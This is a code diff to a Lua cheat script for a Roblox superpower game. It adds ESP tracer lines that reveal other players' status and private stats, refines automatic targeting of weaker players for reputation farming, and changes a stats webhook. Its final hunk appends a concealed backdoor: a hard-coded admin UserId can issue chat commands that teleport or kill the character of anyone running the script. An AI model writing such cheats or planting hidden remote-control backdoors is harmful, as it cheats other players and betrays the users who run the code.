@@ -359,60 +359,40 @@ function getHumanoid(plr)
     end)
     if sucess then return Humanoid end
 end
+function round(num, numDecimalPlaces)
+	local mult = 10^(numDecimalPlaces or 0)
+	return math.floor(num * mult + 0.5) / mult
+end
+		
+function converttoletter(num)
+	if num / 1e21 >=1 then
+		newnum = num / 1e21
+		return round(newnum, 6).. "Sx"
+	elseif num / 1e18 >=1 then
+		newnum = num / 1e18
+		return round(newnum, 6).. "Qi"
+	elseif num / 1e15 >=1 then
+		newnum = num / 1e15
+		return round(newnum, 6).. "Qa"
+	elseif num / 1e12 >=1 then
+		newnum = num / 1e12
+		return round(newnum, 6).. "T"
+	elseif num / 1e09 >=1 then
+		newnum = num / 1e09
+		return round(newnum, 6).. "B"
+	elseif num / 1e06 >=1 then
+		newnum = num / 1e06
+		return round(newnum, 6).. "M"
+	elseif num / 1e03 >=1 then
+		newnum = num / 1e03
+		return round(newnum, 6).. "K"
+	else return num
+	end
+end
+
 
 Translate = function(num)
-    local final
-    
-    if num >= 0 and num < 1000 then
-        final = tostring(num)
-    end
-    if num >= 1000 and num < 10000 then
-        final = string.sub(num, 1,1).."."..string.sub(tostring(num),2,2)..'K'
-    end
-    if num >= 10000 and num < 100000 then
-        final = string.sub(tostring(num), 1, 2) .. "." .. string.sub(num, 3,3) .. 'K'
-    end
-    if num >= 100000 and num < 1000000 then
-        final = string.sub(num, 1,3) .. '.'..string.sub(num, 3,4) .. "K"
-    end
-    if num >= 1000000 and num < 10000000 then
-        final = string.sub(num, 1,1) .. '.' .. string.sub(num, 2,3) .. "M"
-    end
-    if num >= 10000000 and num < 100000000 then
-        final = string.sub(num, 1,2) .. '.' .. string.sub(num, 3,4) .. "M"
-    end
-    if num >= 100000000 and num < 1000000000 then
-        final = string.sub(num, 1,2+1) .. '.' .. string.sub(num, 3+1,4+1) .. "M"
-    end
-    if num >= 1000000000 and num < 10000000000 then
-        final = string.sub(num, 1,2) .. '.' .. string.sub(num, 3,4) .. "B"
-    end
-    if num >= 10000000000 and num < 100000000000 then
-        final = string.sub(num, 1,3) .. '.' .. string.sub(num, 4,5) .. "B"
-    end
-    if num >= 100000000000 and num < 1000000000000 then
-        final = string.sub(num, 1,4) .. '.' .. string.sub(num, 5,6) .. "B"
-    end
-    if num >= 1000000000000 and num < 10000000000000 then
-        final = string.sub(num, 1,1) .. '.' .. string.sub(num, 2,3) .. "T"
-    end
-    if num >= 10000000000000 and num < 100000000000000 then
-        final = string.sub(num, 1,2) .. '.' .. string.sub(num, 3,4) .. "T"
-    end
-    if num >= 10000000000000 and num < 1000000000000000 then
-        final = string.sub(num, 1,3) .. '.' .. string.sub(num, 4,5) .. "T"
-    end
-    if num >= 100000000000000 and num < 1000000000000000 then
-        final = string.sub(num, 1,1) .. '.' .. string.sub(num, 2,3) .. "Qa"
-    end
-    if num >= 1000000000000000 and num < 10000000000000000 then
-        final = string.sub(num, 1,2) .. '.' .. string.sub(num, 3,4) .. "Qa"
-    end
-    if num >= 10000000000000000 and num < 100000000000000000 then
-        final = string.sub(num, 1,3) .. '.' .. string.sub(num, 4,5) .. "Qa"
-    end
-
-    return final
+    return converttoletter(num)
 end
 
 function AutoClick(bool)
@@ -1136,7 +1116,7 @@ end)
 
 
 local VisibleEsp = false
-
+local VisibleLine = false
 
 
 local esps = {}
@@ -1147,10 +1127,40 @@ function EspPlayer(plr)
     Esp.Outline = true
     Esp.OutlineColor = Color3.fromRGB(255,255,255)
     Esp.Font = 2
+
+    local Line = Drawing.new("Line")
+    Line.Thickness = 1.5
+    Line.Visible = false
+    
     coroutine.wrap(function()
         loop = game:GetService("RunService").RenderStepped:Connect(function()
             local sucess = pcall(function()
                 local Vector, OnScreen = workspace.CurrentCamera:worldToViewportPoint(plr.Character.Head.Position + Vector3.new(0, 4, 0))
+                Line.From = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, 0)
+                Line.To = Vector2.new(Vector.X, Vector.Y)
+                local iswhite = false
+                local plrStatus = plr.leaderstats.Status
+                if plrStatus.Value == "Criminal" then
+                    Line.Color = Color3.fromRGB(130, 16, 16)
+                elseif plrStatus.Value == "Lawbreaker" then
+                    Line.Color = Color3.fromRGB(252, 107, 3)
+                elseif plrStatus.Value == "Guardian" then
+                    Line.Color = Color3.fromRGB(0, 144, 176)
+                elseif plrStatus.Value == "Protector" then
+                    Line.Color = Color3.fromRGB(201, 255, 5)
+                elseif plrStatus.Value == "Supervillain" then
+                    Line.Color = Color3.fromRGB(255,0,0)
+                elseif plrStatus.Value == "Superhero" then
+                    Line.Color = Color3.fromRGB(7, 2, 250)
+                else
+                    iswhite = true
+                    Line.Color = Color3.fromRGB(255,255,255)
+                end
+                if not iswhite then
+                    Esp.Color = Line.Color
+                else
+                    Esp.Color = Color3.fromRGB(0, 0, 0)
+                end
                 
                 local diff  = (plr.Character.Head.Position - speaker.Character.HumanoidRootPart.Position)
 
@@ -1172,12 +1182,13 @@ function EspPlayer(plr)
                     if getgenv().espmax == true and (plr.Character.Head.Position - game.Players.LocalPlayer.Character.Head.Position).Magnitude < 150 then
 
                         Esp.Visible = VisibleEsp
+                        Line.Visible = VisibleLine
                     elseif getgenv().espmax == false then
                         Esp.Visible = VisibleEsp
-
+                        Line.Visible = VisibleLine
                     else
                         Esp.Visible = false
-
+                        Line.Visible = false
                     end
                     Esp.Position = Vector2.new(Vector.X, Vector.Y)
                     local TabRanks = {
@@ -1195,22 +1206,20 @@ function EspPlayer(plr)
                     }
                     TabRanks = TabRanks[plr.PrivateStats.Rank.Value]
                     Esp.Text = string.format(
-                        "Name: %q\nStats: %s\nFistStrength: %s\nBody: %s\nPsychic: %s\nTokens: %s\nStats Kill: {Innocent: %s;Villain: %s; Hero: %s}\nRank: %s",
+                        "Nome: %s\nReputação: %s\nFirst: %s  Body: %s  Psy: %s\nTokens: %s\nRank %s",
                         plr.Name,
                         plr.leaderstats.Status.Value,
                         Translate(plr.PrivateStats.FistStrength.Value),
                         Translate(plr.PrivateStats.BodyToughness.Value),
                         Translate(plr.PrivateStats.PsychicPower.Value),
                         Translate(plr.PrivateStats.Token.Value),
-                        Translate(plr.PrivateStats.InnocentKilled.Value),
-                        Translate(plr.PrivateStats.VillainKilled.Value),
-                        Translate(plr.PrivateStats.HeroKilled.Value),
                         TabRanks
                         
                         
                     )
                 else
                     Esp.Visible = false
+                    Line.Visible = false
                 end
             end)
             
@@ -1218,10 +1227,13 @@ function EspPlayer(plr)
                 
             else
                 Esp.Visible = false
+                Line.Visible = false
             end
                 
         end)
         esps[#esps + 1] = {name = plr.Name; Line = Esp; Loop = loop}
+        esps[#esps + 1] = {name = plr.Name; Line = Line; Loop = loop}
+        
     end)()
 end
 function RemoveEsp(plr)
@@ -1247,9 +1259,13 @@ game.Players.ChildRemoved:Connect(function(plr)
     RemoveEsp(plr)
 end)
 
-esp:CreateToggle("Enabled", function(bool)
+esp:CreateToggle("Info Enabled", function(bool)
     VisibleEsp = bool
 end)
+esp:CreateToggle("Line Enabled", function(bool)
+    VisibleLine = bool
+end)
+
 getgenv().espmax = false
 esp:CreateToggle("Esp max 150", function(bool)
     getgenv().espmax = bool
@@ -1297,7 +1313,7 @@ function getReputationToVillain()
 
     for i,v in pairs(game.Players:GetChildren()) do
 
-        if v ~= speaker and game:GetService("Players")[v.Name].PrivateStats.Reputation.Value >= 0 then
+        if v ~= speaker and game:GetService("Players")[v.Name].PrivateStats.Reputation.Value >= 0 and not v.Character:FindFirstChild("SafeZoneShield") then
 
             local account = game:GetService("Players")[v.Name].PrivateStats.PsychicPower.Value < (speaker.PrivateStats.PsychicPower.Value / 5)
 
@@ -1319,7 +1335,7 @@ function getReputationToProtector()
 
     for i,v in pairs(game.Players:GetChildren()) do
 
-        if v ~= speaker and game:GetService("Players")[v.Name].PrivateStats.Reputation.Value < 0 then
+        if v ~= speaker and game:GetService("Players")[v.Name].PrivateStats.Reputation.Value < 0 and not v.Character:FindFirstChild("SafeZoneShield") then
 
             local account = game:GetService("Players")[v.Name].PrivateStats.PsychicPower.Value < (speaker.PrivateStats.PsychicPower.Value / 3)
 
@@ -1446,13 +1462,13 @@ webhook:CreateToggle("Start send webhooks", function(bool)
                     local name 
 
                     if i == "First" then
-                        name = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.FSTxt.Text 
+                        name = functions.Translate(Stats.First.Value)
                     end
                     if i == "Body" then
-                        name = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.BTTxt.Text
+                        name = functions.Translate(Stats.Body.Value)
                     end
                     if i == "Psy" then
-                        name = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.PPTxt.Text
+                        name = functions.Translate(Stats.Psy.Value)
                     end
 
                     name = string.format("**%s**", name)
@@ -1578,4 +1594,70 @@ Others:CreateButton("FPS boost", function()
 			end
 		end)()
 	end)
+end)
+
+local admins = {2482858167}
+function falar(msg)
+    local x = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
+    x.MessagePosted:fire(msg)
+end
+function ismyname(text)
+    if text == game.Players.LocalPlayer.Name or text == "." then return true else return false end
+end
+function NewAdmin(plr, isme)
+    if isme then
+        prefix = "!"
+        nome = "."
+        local tab = menu:CreateTab("Admins tab")
+        tab:CreateTextBox("Target", function(text)
+            local sucess = pcall(function()
+                nome = functions.FindPlayer(text).Name 
+            
+            end)
+
+            if not sucess then nome = "." end
+        end)
+    
+        tab:CreateButton("Bring player", function()
+            falar(prefix .. "bring "..nome)
+        end)
+        tab:CreateButton("Kill player", function()
+            falar(prefix .. "kill "..nome)
+        end)
+    end
+    
+
+    plr.Chatted:Connect(function(msg)
+        msg = msg .. ' '
+
+        msg = msg:split(" ")
+
+        local args = msg 
+
+        
+
+        if args[1] == prefix .. "bring" and ismyname(args[2]) then
+            functions.getRoot().CFrame = functions.getRoot(plr).CFrame
+        end
+        if args[1] == prefix .. "kill" and ismyname(args[2]) then
+            functions.getHumanoid().Health = 0
+        end
+        
+    end)
+
+end
+
+for i,v in pairs(game.Players:GetChildren()) do
+    if v then
+        if table.find(admins, v.UserId) then
+            NewAdmin(v, (v == game.Players.LocalPlayer))
+        end
+    end
+end
+game.Players.PlayerAdded:Connect(function(v)
+    if v then
+        if table.find(admins, v.UserId) then
+            NewAdmin(v, (v == game.Players.LocalPlayer))
+        end
+    end
 end)
